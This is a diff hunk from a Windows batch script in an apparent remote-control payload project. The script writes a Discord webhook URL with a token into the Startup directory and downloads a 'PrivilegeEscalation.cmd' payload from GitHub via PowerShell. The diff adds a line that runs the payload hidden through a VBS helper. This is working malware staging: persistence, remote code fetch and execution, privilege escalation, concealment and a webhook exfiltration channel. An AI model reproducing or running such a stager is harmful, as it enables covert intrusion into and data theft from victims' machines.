@@ -12,8 +12,9 @@ cd /d "%StartupDirectory%"
 echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD > DiscordWebhookURL.icu
 
 @REM Download required files
-
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
+@REM Run the file without window
+cscript "HiddenPrompt.vbs" "PrivilegeEscalation.cmd"
 powershell Start-Process -FilePath "PrivilegeEscalation.cmd" -NoNewWindow -Wait
 
 @REM Delete the Discord Webhook file
